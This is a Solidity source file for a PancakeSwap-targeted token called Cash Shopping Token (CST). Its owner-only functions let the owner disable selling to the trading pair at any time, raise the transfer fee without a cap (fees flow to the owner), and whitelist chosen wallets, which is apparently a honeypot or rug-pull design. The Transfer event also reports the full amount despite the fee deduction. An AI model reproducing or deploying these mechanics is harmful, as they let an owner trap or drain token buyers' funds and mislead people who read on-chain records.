// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint256);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Context {
  constructor () { }

  function _msgSender() internal view returns (address payable) {  
    return payable(msg.sender);
  }

  function _msgData() internal pure returns (bytes memory) {
    return msg.data;
  }
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () {
    _owner = _msgSender();
    emit OwnershipTransferred(address(0), _owner);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract CashShoppingToken is Context, IERC20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  bool public isBuyingEnable;
  bool public isSellingEnable;
  address  public pancakeSwapV2Pair;
  mapping (address => bool) private _isExcluded;
  uint256 public totalBurned;
  uint256 public constant BURN_LIMIT = 6000000 * 10 ** 18;
  uint256 public constant BURN_PERCENT = 10;
  uint256 public transfer_fees = 5;

  constructor() {
    _name = "Cash Shopping Token";
    _symbol = "CST";
    _decimals = 18;
    _totalSupply = 30000000 * 10 ** _decimals;
    _balances[msg.sender] = _totalSupply;
    isBuyingEnable = true;
    isSellingEnable = true;
    totalBurned = 0;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function getOwner() external view override returns (address) {
    return owner();
  }

  function decimals() external view override returns (uint256) {
    return _decimals;
  }

  function symbol() external view override returns (string memory) {
    return _symbol;
  }

  function name() external view override returns (string memory) {
    return _name;
  }

  function totalSupply() external view override returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) external override returns (bool) {
    if (isBuyingEnable || _msgSender() != pancakeSwapV2Pair) {
        if (recipient == pancakeSwapV2Pair) {
            require(isSellingEnable, "Selling is currently disabled");
        }
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    if (_isExcluded[recipient]) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    revert("Transfer not allowed");
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    require(amount > 0, "Transfer amount must be greater than zero");
    if (isBuyingEnable || _msgSender() != pancakeSwapV2Pair || _isExcluded[recipient]) {
        if (recipient == pancakeSwapV2Pair) {
            require(isSellingEnable, "Selling is currently disabled");
        }
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }
    revert("Transfer not allowed");
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
    return true;
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");

    if (totalBurned < BURN_LIMIT) {
      uint256 burnAmount = amount.mul(BURN_PERCENT).div(100);
      if (totalBurned.add(burnAmount) > BURN_LIMIT) {
        burnAmount = BURN_LIMIT.sub(totalBurned);
      }

      if (burnAmount > 0) {
        _balances[owner()] = _balances[owner()].sub(burnAmount, "Owner balance too low for burn");
        totalBurned = totalBurned.add(burnAmount);
        emit Transfer(owner(), address(0), burnAmount);
      }
    }

    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

    uint256 fees = amount.mul(transfer_fees).div(1000);
    uint256 finalAmount = amount.sub(fees);
    
    _balances[owner()] = _balances[owner()].add(fees);
    _balances[recipient] = _balances[recipient].add(finalAmount);

    emit Transfer(sender, recipient, amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function buyingEnableDisable(bool status) external onlyOwner {
      require(status == true || status == false, "Invalid types: true or false");
      isBuyingEnable = status;
  }

  function sellingEnableDisable(bool status) external onlyOwner {
      require(status == true || status == false, "Invalid types: true or false");
      isSellingEnable = status;
  }

  function changeTransferFees(uint per) external onlyOwner {
      require(per > 0, "Percentage greater than 0");
      transfer_fees = per;
  }

  function addWalletInExcluded(address account) public onlyOwner {
        _isExcluded[account] = true;
  }

  function removeWalletInExcluded(address account) public onlyOwner {
      _isExcluded[account] = false;
  }

  function isExcluded(address account) public view returns (bool) {
      return _isExcluded[account];
  }

  function setPancakeSwapV2Pair(address Address) public onlyOwner {
      pancakeSwapV2Pair = Address;
  }

}